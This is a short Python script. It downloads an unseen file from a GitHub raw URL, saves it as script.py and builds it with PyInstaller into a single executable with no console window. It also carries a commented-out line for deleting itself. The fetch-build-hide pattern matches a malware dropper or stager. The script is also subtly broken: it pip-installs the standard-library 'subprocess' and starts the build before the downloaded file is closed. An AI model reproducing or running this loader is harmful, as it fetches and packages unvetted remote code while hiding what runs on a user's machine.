import os

os.system("pip install requests subprocess pyinstaller")
os.system("cls")
import subprocess
import requests
import time
import sys

raw_url = f"https://raw.githubusercontent.com/MatixAndr09/code/main/hey.py"
response = requests.get(raw_url)

with open("script.py", "w") as f:
    f.write(response.text)
    subprocess.run("python -m PyInstaller  --onefile --noconsole script.py", shell=True)

time.sleep(3)
path = script_path = os.path.abspath(sys.argv[0])
# os.remove(path)
